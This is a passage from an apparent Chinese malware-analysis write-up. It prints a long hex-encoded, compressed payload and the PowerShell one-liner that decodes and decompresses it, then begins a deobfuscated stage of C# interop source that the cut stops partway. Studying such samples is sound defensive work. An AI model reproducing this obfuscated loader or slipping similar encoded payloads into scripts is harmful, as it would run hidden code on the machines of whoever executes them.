dfa73edf21154e398bfbf7e8c3735a75f9a47ebe7ff9fcdbfbd4dfbd66ffc1c36f5f9dbf9b3ca7f8a59c5224b5b733f9f4e0ee39e5697e80b4d0dd4f7f6ab1fffa276981e5dd9b3db280d7f5b75f5cfe64fec9e9eef9eae14fd7975ffc3eef7eeaf7bebbf37b53d4fd8022c63df2f2de50568e3cc2df7b797677e7c197d377f5fa07bb35c29da7b48a572eefde7f55bfb9fecebd4fae777e0a79a4e2f3376d41cb319f7fa7285ede5fb45f52eafaea59fde5eeddcbdffb13e2835ff49de5c3d96c3dbb9edcdd69c9bb295f3ef8c19bcb07d39fb8bf7bf0f09377cb07d3bddd97ebdfe7eec3efeeaf7f704ef9a9d94f570fbfbd9b21def8f2eec1e5db87947e79b1ff09c555ed9bf3bdfcf983d9eef3977364efc82983cd79f89d07ebb39ab4db93d992c2d035455615e5683ff9eeddd5cbd5ddeaf417918bfc83366fdbcb7b0fa7b4769e7f523d24323e2572cecabb6bca969373315bfc5ef329c595e4a22ebf7d8fe8f4b23cf894dcb2d99b37eb7bfbcfeffea2e527cd7dcaab1ffcdeedfe2fa2e4e7db07d375fec9c35f444273ff3ba445efed3cb85cbe24a4eeeebffbbd1f2caa4f288bb6b77e4366e1ee570f284dfde4faee5efbf0cbe9f5e44d4be248d9418a4829acbdff60767c9f72cd0fce3f7d433ec839e9875f44ea79f7eeac2967149bffdecf4fcecff7f6669f5054bea4b5b0192dcdcf6714025e4ef77e11798af9435a9a7870bfdeffeacb9377df6eb257777ff0836fdf9bdd272ffa93d5effd869614eeed3e7cfbb03c238b73fffce564b726a7fc1e39990f2fcb2f9e3fff92f460fbf2bbbba499eaf3dd2b4a83345fce0eb2e5573f31afbfa47cccee831d9ac79764327f62917ff9ddbdddef1efca20999de3d64b8df90e3f59d82c2e827d07ed357f71f2e97e73f41399e83fb6fc8aff8bd2973f220278bf79456c5effddeed4f1fc0b19e50f443e9b5b2bd7bfff9a73b93676fcff79be5ecf8c16cf1e9279f54df864fbeba77f7deeffd60757776707ff7e9e5ceea60efde573ff1d574efedf207f73e79b0a4f583e983b7ab4f4895ad26eb4ff63f7d401efdd3ef5cee93389ebfa325b3076bcaf1ce3e39255bbd4b32f9835f744d068c66e7c1a7979454a9bebafece0f1e7cfbb4ba3a419079de502eeed90f2887d77e72effaddd3bb94b378ba77f08482b0834fc8ad3b7848bcfbf0f2dea79f9075a2b880563ca70f765b4ac6dd6fee61fe2eef9597d3fb3b94cb7b787ff6b4fe095ac2fa7633b9470b483f494ae6c1c18a1cf2e97d5acca2889b7ebbfb70e7c9f39794dcba7bf7cdbb25af917e422a6996d30af7fac1ee1bb2826f1e7c3aa364262580dfeee614c9bdbc5c7fb2260b7bfd9cdc8016f07eeaa77fef87e4439e7f7a72fdc92ffa45bfa87ef9539f7c3abbfbe0012ddbfd606f67fde08ce20d0ab35ffee4dd759d5390fea0fcbdf73ffd763b9bd022e9fdf62d81b8f7b2bcbcfbe6dbf77ee27239dbfbbdbffc7d68adf1c1b75f7e31fdf2d9cef9bbd97a9f3c944f8abcfee4e1d5b32559f4936fbfba4fd97e5afb7ab3fe8462e9e50fee529aedc14f3d3d2f283d47fefefa61fe744dc9cc5ff4f4f5dddffbe9327fb0fb7b97f7484d7eb27e9e7f3aa3a4cec307cf7f307bf7f0f75edebd7e724d766ffffee4c1f4d33925f3eeeddca3613e7848cb263f20fb461af3e1fd3764c73e79f3f2f739abee7efefcfc177d9b56eb7ffa07cb9f2647e9d94f53fee993e7a4c0ef3f7f303dcf89d7befb49f32989eeeb4b5a3eb847d9ded94304dfebc983073015b34fdfbc6d7fef65fd8b2e691d73bff8cea7e72f0ff65e52ea8f02a3d7b4da769ebfa5bc6ab9bef8e99714c79ebf6c1ebc7df1f2a72861f3c92f7a72f77276f082fca887c70feffef477ee3f78f153ef9e5390f78b7ef08baa599ddf5fd3ca3db90839ad167ff5c9b769f9f6078b87bfe8938315659bce7f9f77f5b75f4ed7cf2eefb5f7de9226fc7279777dfffce1e583e3fc2eadaffdde0f7f2fe2e72fa6f71f50b6ea41fe6ab7a1e5f79ff8f427b3bb07d94f5274ff74993d7cf87b4fafdebe39bff8e43bd72fd77bc5b75fe6e4ac5f7f79aff8a99794fab8f790b4df0f76defede0f57e5ef7d39fbbdf2bb4f7ef2074f7ffa93df7bf1f0deac3edfffa4febd89db2e7fefef4eef7e6741c98383fccd4fcd2eef6339acf984f2269f5072f7f7fece2bcae365346eca9ded5dad6ae2f9d55e4181fd657dfe8b9eddbbfbfade9befe69fdc5f2ec943a2c5ea5946a9accf5f52f05f3c7bfa32ffc1debd7b94c85ffea24f7e62f7797df08656b3c9e1a610ea7a76f9709fd652c9cda4d51b724fcfaf9f7f77e7eea7a4d0aedf1edc2d4e1f9edfdbfde4933797cf777f6ff206967bbff7dbbbd337cb4feb3d8a8e560fee3ddfa334e3c177aeef5dfea2fb0ff2abfbd4d7279fcedffc04b9c0d34fee97af290b714901e20f689e762f7fd1272f9e5f9e7f79f7abddc5657bb9ac72d2f194d3fb6e7e9ffc896b1ad8d5e5f3e539f1cbc3e641fe697b9e53ee34ffc1effd052d9653ecf090bc4cf22e97e435ffd40ff2d7bf0889ae672fa7f7de92022743f3c957144cbcbc4feec082bc8d87f9839c16dcee3d3898edd2eadffe53caf47d4acbe634a70fdaf30609ebcb97cf773fb9fbc905a5168b7b93073f45beea9bafeedd7d767742cb1bed43ca97be6d5e7ef5eed901b957c5a72ff71ebc9b2d5f96777f926c5c71f9c975be3c5fd6149b5e3c3cffbdd7f7bff37b7f72ef07148253befc72fad3bff74ffd5473f1f0f2e18b4fe7e49affe0c183e7dffda4fcc9cb035a23690e2ef71e52e046c112b2bb9f9e3ca7c8e062ef07df7dd8fce025e9e69f22d24f2eef9f53f2f1fce5ef433421dfeff8a7ce9b8327bff75b4a617c3abdbbbcfeeebbe6cdc3ef3c5c7c72706ffd80227d9a6fca817ffb8be7f767ef5e7cf7ee27bfe8cbf3bd9f3a780ba2e5af28c7f5d3f9e55707cdf34f0ed607b40e4179e6bc5e7e798064d2cbaf0ef2dffba7cedfbcdc5defaf96e73ff5edabcb077bcb7b5ffe603d59372f2edfb4bfe8e1f35df2de3fd9d9fdbdc9ef7bf603728f7ed1530a97ebf6f7baf77c7d70f9ea738aaa7eef837bb3bdf307df7939c152d0deefbdb8f7e9e5c1e29256f7ae415eb27d0f96135a8e79b86ecfc9f1cfef121b90065a5e4e3f7d38a97ff2939f7e7970f7fe9b7b0fafeeef1cdcdff9c1effd7b1fcc7f70f9e99bf34fcbe5effd49fe66fd53570f1e3cfcbd7faf9fae5b5a377af0eef9bd1fdccd3ef9bd0fa6e797335a2c383f38682e3ff9bdebfb57b4fab24b8e3e2d61d0cadc9bdf7bf6dd7bd4c73e99fc9faaf3ab4f273f7d69b29ba42ccb3794cd5c3dc752cd4ef9eddf07c1c04f7dfac9b77feff329596dca9edeffbd69d9e0c9dd2fcf1bf258ef66640c16df59bda318f755f9f653caddb4fb0f27cb6cb5acdebc3e3fa064c675493e1f3945777f9fbd37e488dddf3bf89258e0d3efe494f579d8520af9e583fb0f762971f7f209a5a40ebeb37bd94c4e1fee5e506ef0e9eb4f7ff2bb7711187cf1539fdc7ff1b2f9c1c37cf71e25a0ee5e3dcf5edebd5ad1f249410cf2c9277b4f57c4119f107eefbeba7bf9edcb970fe7b45c75f7e1d54ffe643bdbbf7e63629083fde7488b7cf7c5fd4f2e4922af777eef7ae7e1b3bb773fffa94f7ffa1e1946c2f0eecec54ffde0ee272794675b9e369f7ef2f25efef0e0a7cbcb86b2b80fcedf2c9b179fbc5dd2ec11310f0ebe224a7d72f0d32f7f9feb62995f92467e786f45cb49cbe6e59262375ae3a50456f5f0e1fda7eb779fdca3a8ea27efbdfc49d22b8acdf3c9794e8aebc1e70f5efedef78be748f6d122f5c1c19b7bbf77fd7b1fec50f6e1eeddafbefae407070fde509aea17bd6cf7f3dfbb3c3ff8c9f3f94f2e8f29e6f8c1f2fc93f9dee59b925cdea764331e3e7c36f92e29851f7cfbeefe8307dfd9a188edeee7e52c7f78f7a72e28aff5c9c1276f675faeaa87cfbf734e54fa2e69b95fb42687ffd38734c7b39f24af67ffed3ef95334b607e79ffcde3f6897e5177bcf960f1efee0a75fbef9bd77775664380f76ebea937727dfcecfef3e7b4324ffb2fc1299929f5cd5cddd939ffaeee56af9e5dd773ff9edbb4f1efef46ad9dcbdf77cd9ecdf7df8d5abfd7b0f2e2faf9f50bae0e027976f7f9f4fb2bbabbd7b3f49d98b7b77d7eb37b4ec401cf4e0c5f48afcd0cbfb0fbeb87bfee5e5f37b3ffd7b5d9e7f71f7e2795e90db43e27e40e1caf9dddd97b4bc788fbc5672c6cf166473283371f9e2a79ee5248bcbea2732a481495f4cae1f7ef7ee4fce7e6fca79c3564ccb9ffaa9fb6f9ebffae44ddb509e9e16d5481d7cfef09c822cb281f9ddec35f9153f78f8edf3ddebe207e7d3bb5f7cf1e2dbcd01b9c4bfcfbbfd7bdf6e77ebcf1f904ff7e63e65ace04b93fc7c9a9325393878f7d36d41ab0b7b0f7f6f52cb4f9e92eb48b2fe664a79ab6f9fdd7dfee6bb94096a97e4ff7d7a6ff9f6eea7df797af721c55bcbbd877bdf597efec5bb830714d5dc9bdcfd459f503aeffe570bf2fb9f936f734962fd963224bff7cb67cdc14fbdcc497ee09e2fee7eba2243b8fff6175dfe5e2f3f218dbdfb9dc501a5101efee4ddfb33f2947e0a2bc830055f3e2ceeddfdc1abef7e42eb0e3fb83ff945773f2549bef7edc55d8a0149b23f45ae97267342d69f7270f7db17e7afde11da3fa065c15ff4e4fceee59b4fcff3e7ebe9ef753e79b1783bbb47ebf53ff5c9e4bb64a0483228df7cefcbe5c143ca62913b77490e65f570ff6e5d5ffe3ec5e4ded32f3fbd9befbf25efffc1dd77afef7d3aa3f532721996afcb9dd9173fb5f7667df7d9931f9cbf9cedee4e2911ff607942e6fae1d529b9d9a4771fd0aac277cedf7c57c56375af79b85adc7b36bd7ff0f2c127dffe89bb0fef53a474fd29a57bf3c9ee2fbaf77b538070ffe5faea934f3ea1d5e14f0e76665ffe348feed9fad34f8aabbbf726bf3782a5cbdffbee5df26c493bdfbda445a0bdd92f7af07bbddd79b9f37bb5e7e76f5f93b3349f9171ff01851497bf17ada6dc9bfd5ebb0f7ff05397e59397d34f570f0e26e7f77eeacde5c31f7c7befe1c1cbe96b4a3ffede5f3cf9ce25e7619ed7e7f72f287df3a4dca15875fa83d75fdea32078fef2937b2525392fee3edb7fb5fbed757e7df7f7ae5fdca5f5147264d6cf7fefbbc50f2882baa434d84fd7f94fdc9de60f9fbc99521878f5e621ad9efda2d95d5ae0a2258ae75fde3fb8bbfabd29acf97dee96cd2f7a70efc5ef4d698d7bab9fa64c3d855a8bbb570f170fbe7379f5f4f79e5ddefb648f66fd41b3b8ffb098dc3d78fe72f609e5a39e4cde90b73c7ff8f2f76e724abf1283defda4c91f5c3e58af9befbca124ccb23a7f787d7ff9edcbe984b2a55fec3ff8bd7748a64f9e7df79cd87b9f5c9f2f7fead5c3dffb070fca379497261df7eef7a615e8fcddbb4f9f3ffcf2092d7d3cddfbf28022bf9fbc5cd7075fde7b59538879f09496e00f1e7ef5e9f35fb42693fa530f767ef0f265fee0f7a6e9a548e6dedd8325ad03ccebf37b77bf3df9a9ef9007b8fbc90fee3fdbc5f2d5ef9ddf3db8baff7b7fd93cf8450fbedc273d3fa335defd8bc9657342bcbbde2ff61e3efce91fd0b267dd7efaecfcfc8befec3ff83689e04f3cffbddf3ca355b6870faf3fbd585ee68bfb2feffde4e5832b4a5cecadbf4d4e5a7e555214befcf4c5c35f443f1757d7df9e7dfac983973ff193cfce1eee519474fef2edb3e9dd8b4f2fa77729edf783d76f3f7ffe132d252cd6d5c10f28f593153f589f9f3fbb7c70f034bf77f7bb9f7ef2fa3e0571f9f3d7ebbb3f75be98cebe7df070effe5bca5b3ca4a0f7fcfad3bbcb657efe7bdd6dcf3f7df2938b2bca78bffcbd2feb87331aebf5b7bfa8c8ea3fdcf9eef92fa2c8f4f7fe094ad0dffba94b6272747dbef80131639113c3ed92e738a3488bc64ffafef7faee274f6a5a35fe64f7f7fef2fedb4f69f9206f9ed1e07ff0f017fdde9fac9f2ea7f7bf83a459f3d3cfbe3cf889e72fcb874f9ed30a3b39eddf9953629816ee1fbcbcbfa608f7934ff68b072fbf4d9af53ccfae3fbd776ff69d87c5eaf2e54f9108ce7fb0fee4fa2bcabb3fb9bc2457fca7efbffcee0f76ee3dd87b40e179f9bcba5fffdee755f69a3ca4f535a5b99f2c779b675fdcbb7b756ff272f9ec454b315d59edfc5ee5b3f9ab07675f66df79557e7a7ff2e6173dd8fb74fa7b7ffafb7c7af7e407c77b3fbd7ef3e52707f5b7df36f3cbe9f9e2530a351e16f777bebc38a025ed4f7ff02adf7df97bbd7c49292bf249691de3c1b7bffc7dee239dfde0fee5f4e03b0f8a1d5af22349a745104a2c93e7f97c7970fdf4de970fef3ff8e9cb7b84252588ae1f2e1e1614b11e3c202efde43e05f994e1ba77490b1f149d7c42f27139fd293223d9e5f3dfbba11ce5efbd5cdfbbf7c9cec1eea7bff7ecf721edfee0e52f7a422befdfa11426e9c10777dfac7f40b9d9dffbf7bafb86d6a07feab2395f4eb2bb77c971de23823d7f481e1fbd337bf87276552c2987bc8be4defd72b1fb9cacc297df7db077efcd939a129dbbf7173f7979efe0db5f7ce7e0debde73ff590a2c2929646695df7f27c39fd32a7c5aee71459fde0ee2f7a9eff14659bd7d37b642568ad7ff7c1c34f48760e3e79f28696e13e2d0f0eee5ed7d5dd9fa6d0ecb2debb773eb97f97005c5fd222ebe2f99492a3afee5fbef9bdef2d29d3babf7e7a793dbf2067e693d97276efcb07d3eb8b1ae37a40c992dfebe54fee92ea258fffa73efdc177ae69c9ecfee5effd9a525794d89efda24fafeacb2f8dbb94914adc297f70777a97d62faebef3f2ec134ac3bfa1a5a39fbc7f796ffee617dd3fdda16cf9f4ee04abc5bf3727332f1f900a59fd604939fb4bf2bc9ed0f7079fbca32cefc9fd839fa6d8e2eede0e89ce275714195d92927bf9fbbcf9bda70fde3dfdbdbf68efffe0e5ec3e25765edea525d897e446cdeebda0d99f2c4971bc42ea985629ef9fdf9b7cfaf0073ff8bd3f5d2f7f2f4a6fb63ff9f2f7f964f5b2babb43ee1ca9983713ca8453ce794dd6e4e95b4aa1d1ea784e41e6e5f54f34942c6b9f5fbe216371fe7bb7b34f7ffacde5dd1d4ab861c5f0fc3e252d1ebe7cf9eae1bdfb0f1eee3fa5153cca309fdf3df84e7979f0c97246d12f992e22dff5b7697174f99dcb872f291ff5c9276f7ff072fae5fdd9eff5e6fc271ede6b69f983a2de5f44c1434eb9ea7b3ff99d9f2659a1457a4a661de09fe7145cecbefbbd2ff3073ff9e67c36b9fac9df7b4d2b3e0f96ab5f74be7e387df2908c0cf9c4bbcb927278e77bcf2966fae42925d10fae96dfa66cc3d5e4de8bdf6777fe94f4c0eaeedbdf7b36b94f5ae1fed32f1be2cd2f1ee464990f48117cf2292dc07cf262490b266f299f57ec9ddf2d9f7ffb93fbbf6845637a706f76f7e4f5279f501aff65dbb4eb079f52a2edddee0feeee7d87163e1e5292f13b3f45cb7434dafccdf9ab7bcf7faf970fc9ccddbf4b41236572aebf3cbf7bff075faeee7e4a6171b6aa498297bff732cb0f7ed1fd7cefc1f98a54d5ce75fe83f5e2f2cb2905a6cbcba67cf070f9034a46de5dbcbc571e3cbcdefbf6ef4dabf1f7ea9c5831ffe4ed9a962d0fbebdfee4e17773329839ada31d3cf97683a5b34f1efede5fde2db235d1f8ddeffddde5fddffbee77de7d7b79b0f8cecb973f39fd450f7f9ab46af3e0e00794bd3a2011bc870865f97bdf2f69e990bcd90757734a4813cb3e251bf8d50f281cf862f6a0f9f6dd1965a029397aefcdb3cb4fdebebabbac9f7f97327ff5e47256bec032f34ffdc4a7f77ef0f2f26cffdd5dd2fb149a7df2706f7799bffbce0fc812ffdef73ea1fc41fef0f77ef609a55f68ad0749cecb7bf79fe73ff9ee2b4a197ce7fc937bb468da5c502437d9ff64593effbdaedb9d9ffcee75fdf9eb49f9e98336afcfbffca47df1c9faf77a72b277f745f5e0d9ef9d5d4e17af3ffda9bd267fb33c7ff572be4739ccf9ab279f5f66ef7ef0ae3a7e436b722fbffbba5a5c7f72fa7a46ab1b3ff97bdd7d41eeefc5ef9d7fb9f3d3a7cb97ebe7fb6f96775fbd5e9d15c7e7679ffedecfbefbc9f3e527675fdc5d5f9c9314fedee47c5d3eab5fac0f5ece9fdd3dfb62f2eceedee5fe6b0a2f76288c3c5f522cbcff83c54fff3e271797d5ebf3fc8a7ccf9de503b2a33be5dd7bd307dffe89b7cfe7cbd3c9ebf32f296530ff6a727f72fd8383bdf26ce793f9ddf9bafdee29e5fa77773e79f2ed87bfe8ed273bf7af9abcfdc1fe4f53bee9fc27bf5abf24ddfa69f9e4dee5e4de9b1fbc79fe7b5f5cfcd4bbbdf5b3d5d36afde4a77ff0829ca89733d532d527e597df797b36fbeeab5f54fea2cbddefbc7afaf2e5d35793f3e68bbb9fdcfff6779fef2cdb9fdc2b175fcd575f64b3af56edc9777fef979fde7df3936707bf7775f1a2de597ff183070f9fd384e7fb5fb6bfd76576fd65fb6efd8b8eb35f7430f9fcbb9ffcf4174f1fbedbdf99eeeedffdc117f7ae9ebefb0e257126dfa69531720768ede1d36fbffabd0ebe2ceb7b273fb8fe45bff7e43b3fd899ce9e1c7c7776b0fbc9135aab7930bd6c675fed913771f293b3f90feabde52979650f29bd42abf4e7cba78bfcfaf2f2db3f75f7eef37be73b9f3fa09cf0c37bf93dca76640f7eb068ee3e21aff307392577dafc27165f4e9eefed2f7ffacdddd9fcfa07afdffdde3b2fbe736f71f0edefb6bf0f2df7fcf4aa29765fbe797039bbbbf889d5f3fae957df595ebcbbfbf2ea78bdf3134f7eef69fedd87e7c70fef2d7eeaa7aebefdfce1b7efbfba7bdefce0dddec3fd77d54f3c3ca044d7836fdf7df0eea0beff8602a5a67ef874affe6a45acbe9ad56f767ff0e5793e7b577cf7ab7707d3c577bebcbbfee4bbb438f1e093dffbf77a78fae2f41751a29b54c327bfcfc3ecdefa6c3599153ff8f24173efbb93f693bb57d74f1e3edd39ff7679f0c9f4f94fefdda748e4d977dffda2ec8b776f16f74e269f53de6d557ff9aa78b25bbeadf3ddf32f3e7dfd8327b39f38b977b173fa76e7dd2ffabd7f9feb079383e2dece62f9e597e484922751ae1fde276ce75f5dbf98df5dbefee4e02d09e8fdef1e1cdc2b28cbfff0939ffacea4feeef317bff76287c298d75fb5d31ffca0f97da6afdbf9a7d34fa9b7a79f943ffdfbec4d29217efae9eff529c5b6ebdffbf779f7f6939f5c5ceebebcfb9ddf67f953b3fbef7eeae5f9b73fbfb87efde0c5f493cb4f1ebc7af3e5eff580a29aeffedebbd3cbfcf5bd2fcef6efbe7cf8ee7c6f71f0d32f5ebeb8beff60551d2c28d970426ee9f2a23d78fee6db3f317b7670f28365bd377bf0e6f7def9e9cb1fecffe07295b597948fa4e06a4dda7995bdfbeef23beb4feb363f2e5e15bfcfe7df79f2132f175fae7efaea075f7c5256e4b2fe60ffdef9172f5eed2debeacd0fbe7bf0d5c14f4fdebdfbeed3cbb3e75f7df953939f5cfed4f9fde9ce7a7efec9b78bb78beb97f79f7d67f2e9fe4f9f3fa5e5dff2fc271faecf7fea75f9e6f9e4939f58d4bfcfce8b573fd8ffbdf7a6a4ad76ae763e39985f239d39ffeebdbbd3ead5fddf67fae2f9e2f7fa82a2ff1f2cce66f5ceebdfebc5deba3a3d2f28407f7dda7ef7d5b7ef7e3529e6abd5e9e9747df0fcdbf7a65fdc2fcfef7f7a6feffe573f399b2d8aeb4b92812f7fea3be74f5e7f35a375d69f7efde0c9efb57ab5bcb77837b97bfe7b3f79f7dde6ddf21e25a69efd24b98f9f3cfca9379f5cadeebdbcbf33f9bdbfdbd2d4dd5b2e2e7ff2d5bdcfbfbdb85c9e3c7df1c93b12fbefdc7b49e9b6bddffbfcf4f7d927767df58bde1c1ffcf4f9f21795cdd52c3fffc917edc367ef2e7f9fd7a7b4f6fde2a7ee1e3cac5fac9e9053fc932f767faafcf68c5c37b27b14a4eefe5edfdd5decd16869c1f3e4ddef93efeeecceeabbf77ed1777e9faf7eeaa7deb53ff9864cf4ee4f7ff2c92ffaee01c553b4f6faea177df16ebaf77b3ffca9e733324a3fd8a99bfb93275f9dbf557d33bdfec1f9ef7d30f9e9e672b2581c3cddbfbb7c93af1efee4d383f3b70fcaf6f2db177767b4e678f0a2fea9cbeacd4fee2dd7655e2e17afbe73b15eedce3ebd7bfaf0db64a18be5decb4f9e7efed5f4f37bc56abd7a33fb64fa7236b95b7cf7edfae5ecf9779f2df7bebbfbc9de8bbb3ff8a9c5f9bd965651f2e3a79490bbffe5b7bf24da9c67b4b871ef5e7efc83735a3b21ffb5bddb7c7977355f5e2fdfd2aad6fd37abdffb07afee1ebfbb779f96965e3e793a2b3fff89b377f75eeefedec52707fb145f5fbe7cf9e5fdfb3f689fb7cb77bff74f64075fd1dae3dd4f5e3f6c762e7ee2c1d53b52ae77efcdef7d7270b058beceeffef4bb4bf242ce96c4b3abfa931f3c68697d8f68ffc9bdbdcba7ef5e56942cfde4e1ceeadebafda94f7efa075fe677cf3f6f9f7f4ae1f2dbc9ecf5bd4f7eefdffbd3bb2fbebcb7c89fd775b3be5effa2c90faa9afafff4d5deb7670f3f59ec35bf687f32fbfcfcdb27d441fee0ddef734a699bf5cb87675f9dcf97cb574b4a483cfcbd9a4fabfb07eb770fae9f13df175fdecf970f3e39f9bd7ff0fa6efdd5a2f864f793f37ceffcc9773fdd597f4a4ae2a7da9ffe7dde3d9c7ce7fe4fffe0de6cd19cdf9b35f7663f7df9c9f4f79ebcb8f7e94ffe22f20a1eb69469bc7b6ff5e2fe4fb6bff70f1efef4eeabeb077beb4fdfde7bf6eceec50ff69a4fc9967ffbdeef3dbdff7bed35dfbd2ef383ec2e757a7eb95bd6554d8bb00d60173fa050fac5a7b3fac1e2eefddd079fae5e3db8feaafdc9ecf979fb83e2e007df3eb87fefe5f945f38b8e3f2f96dfa9dbd75f4e5e4e9efcc4e2a7a60f7f40abea77bff3e5eefd2f3f25a097974b4ab1922b77ffe1c383bd9f7af0c5d3b7cf16bb3ff953dffdc9c5f5935f74fd8b565f5cbf5aed3e79f03acb7f70f6f9170f7ee2f8f4edeff3e6faf4e2c9d9c9fcf5b7f77feffaab87bf17d98ddfebdedef3c55745f99d774f7e9f6fefd02ae57d4ab26d5d2c0bea7bffd3bcc99e2caafad9a347df6fc9855a5627dfdb7a7afe9d9f1e6da58b2ca726141d2cf22fc65f9ea5ed34ffe9c997db57f90b6e611ae46d56d25acf7859154d93d7ab4575126d5de7b32c7f25ef441aa4efae9e7e7e7af61b27bf71f2e4f2275e4d9a9f1ee70b7aa3fee2f7fef4a70bfee893d5a27d74b9ccd1fcb3e6a77fffb6cdf0ab7d655acd62efb877a841efa5e7afbefafd4f5f7d79c27f7c56d6ebdf9f4832314d7ef19dddb4bdd84edbe5ba9a8eefbcadaab25d7fc928b5e75553d5d3e20bfeabcca6d573fe2da30e56ab63fe3d5f64cb3a6fd60603feb0a14fbee2df1e9da48bbc2d6665319f6eb7f9c5d6d679815e798a7ecfcff25935fdfdcb225b186cf269bdae1afe332572b7c5b220cae7abeb37db29ff3b9b1da3ddefc983c16fbf84ff49e9c12ffa6be44ff351f0c1e087f68b1f1bfae6f0ce6c311d2df3b7d51b8c76be4acff37a8bff9eb7c5778951a624ee6d9db5af7f6c0310e1046a3c5dbf4ef9ed94d86d5a94abf553fe6e2b5f16cf8984f577c7795935c4bec3e07ef1e03777ee74304d47bbe9682f1d5575fe53e3ba7dd92ecfd2d14e2a0302e5b36545d3b85a9ccdb7de9df2a716afadf4bc78bf2189e4bc4edbfcf3a1410dc1fbc5435fe890425c65684fcfb4c371d16cd9815fd38af84fbc7ef35da03f04f4f08effee278ceca3a767b718c020c4fc07c5eb76992ff2f2f43aabeb2cfdec1312b6bcaed7d3c177eedcf9f2d98bb3dfffc59767af5f9fbefefd81f47945fcdfa6a33bfaeed61d99b5adadbc5eb7d335e91c1a66fb725c66f3a6cebee843483f4b8b26ed7e3c84438fee4cf34f3e29d243a88a13a148933e4ee9931dc0a65115a404abf3d89b8777b6f63f2574ab37e3ea7c6968bca2f70c2df8ebd8ab01268c0575f7bba677023478de03c886c9770226df6ab40171739d2fd6cbd3084788ea38f465e3b3d41720fdb0f3caf0b46d9d7f0936307343d07a5c41c4ebc1db61f278a38c350ab10c48308066645c1d298abf6827822781d45fca36b6d99a2d4ea6f9bbd3d9f2d85017844d674575994e0970dbd08f72b25ef9003aaafaf08eaacc393308fdb6dacacbd932fb76de5465205eaa7ec972cedfdcb6b59bbd4deda0f07fecc7742eb7c8e5a94ff7ee2d8befb64df69c44dfcc5f4c27e3358af2a08405429a37659ef6ec4f473feaa0533614b7d18d3189205d68a890b6ebca6f6e5e61d94027222ab11665b95e46bfb85c9eaea25f341759f98c5927af4fae66d13644852caa1102d3f375be270614059d4eefcacf582bfe267f978fa939bb24fccf1ef9e56d73ddb84f9aab6ab62caef4039a49782fd361b81e43e1dfe6986792deab5fe64c8f98523964786db9ce28b1e0fadea169a1bea5b3cfd255d5be6df2a7ab72ec26ad0b6897da31f9af661b5a4181f0b8be7b55cd5f5f6d6ab9bbc3cfbb9df4273f7fdaeea73b3bfbe603edc99b68d243ebbb778da8c89b07eff16eaf7bd19c2fbf7af3eaf8cdeb41a539990e8f409171f21b88d9db69553e81a9592cabba20864e6592065d2c816264f9ce1d66636fd24528e0f231680fb2ce3eb9488a49a86ef9bd21fbb145a6e3cdf117afd88c900d39f9f2d5cbf42a5faa6267017fa1f1b8d7d2b4ecc3f3a8eac11102fadf75de1cd2f41e01cc1806bdde40fd13512e0b42de03dbd5ffd4845e7afdfaf8f9c9ef7ffa86907a7372fae2c59727eca45c97cb0a0abf63471cac430a445e3097b5af89dd5782f0eb9b5efc3e7951af5f3e1f23b698e517d9325b2cbfda6a8e95e7be17e9c83a88e9de3d22c057377511d0b2e77db1e716a5cff7ef9459417cb5fe45e48b9208ff5ea4d9afb3e75bf2433c3e8b5f84a0143b9d75fc3b515c57d5d3d8e76ddee4afa22f90a62c9ec7be214b1aed629653e8bb5c56d3a68876452a299bbf8e7dc33ebabc7cb20972f4cbfcb268a7c7916f822918e030f258f2dbb0293b05b3f6b51580f8ac1fb6eb15c5d1b76bb83cbb45bbbd597e59638e5665b7e550cbc994fc8a6adef5be6c43cf346c6ea8964674f7409bbc5d4f48e4dae3b22c6e6a4bb2353f61cff6f7b975cbdffba6fec956dc040d6d6e8273138c1bf128dbe20dcd912aa08156d6c6dfd0ce9bf4cd0d31d7141ddc520719bdffb3a77e0e6767e2a1df40aed9991a8d9bda89bb7f03eb9b186273b3801c31936bc8a2a6f61ba1cea104ac2b9e26e78393c7681b0501acf5123afe3a3744a33aff490d08c3ef0ccb44bfacf1a5d3359dafa3d131c3a1245ffb2edf60cebf7f27a7419383c10a5202a6d7a9b8df65391bef51c23f6b5a7172b748db50a059964f7b44125f2218fc68664d2e38a49fd149cbaa9adc16c5cf3623f8dd9b106c494faeb2e5eb39664e930a7e48f93eb86c2257991390b73762e31c4f6b177a2ee97545dc9c3fbd356ad4eec9904b943e5ad66b5a960f30b96934941c4692f8c6c114753e5f9e4d045171362dab8e6243dde081df7ab4df08eac201619e74930097f965fe3cc8ba44c515932029d4d8b78ddadcf658b4a3234baf25e2a0e3595e17c4070341d8c81b03d91a72fade9d0ee9896e4af8d6c4663a76df36812f6155bdbcae5b0acf3a727939cb6e541c20e6a2860a552b40e4882af730436215ef6acd710bbde55bc8d8e4d18a11b9a175f154729727ce38775b4679b6dbe83611b24e4e28213d40b7e707dbd2d16aa0298263ea7a41ab5ec3e3b4d1172674753cdc3094e9ceb79c49519bab0915934db9358395657642de3416eb88f858ee234cf021529dbdcf4645b33c1e93c4c3cd0407ea6fa361a5e0657b0c72df04ff3ed38773264f5d90f8f4ecf9f14fbe3813a6a0345135ed8f5b3d1ac061034e11dbbb5393596c9aac9c1a92397f088d7f31bf5116ed57693ecd560d16f3141d7ab980a740466e45090c9a2c5a7824eaad5f8d3973f61a13dcacb96df7031e292dee4ded5a1ecde7d6d61dfa97fe4734face36fd7c8789fefebdd1eef7eee4d3e5e9abd367b4b47ada549357a797ed62fafd8b17c8387c6f2bdd1a7fbcb5b595def9f8635a3ef8e9edefdfdf1b7dba37daffdef4f4e5eb2fbe9c3efac917a7bf5bba958ed38feea487c58bcbeaf7cab7f3772f09f9e6eccb17f4fe45fe66bb78932fd274ebe3cbe35734a4e2f809fd5b9e3e42c26efe62f6f19d34bd33a615ecaff2ef6da7bbe3f176baf57eaf8dc95c5fbcf9767ae7fbe9f677be3c5b7efc717ae7374efe1f&#x27;</span><span class="operator">-split</span><span class="string">&#x27;(..)&#x27;</span>|?&#123;<span class="variable">$_</span>&#125;|%&#123;[<span class="type">convert</span>]::ToUInt32(<span class="variable">$_</span>,<span class="number">16</span>)&#125;))), [<span class="type">IO.Compression.CompressionMode</span>]::Decompress)), [<span class="type">Text.Encoding</span>]::ASCII)).ReadToEnd();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>去混淆解密后</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;$msource=@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Runtime.Interop&#x27;</span>+<span class="string">&#x27;Services;</span></span><br><span class="line"><span class="string">namespace Utils</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    public static class 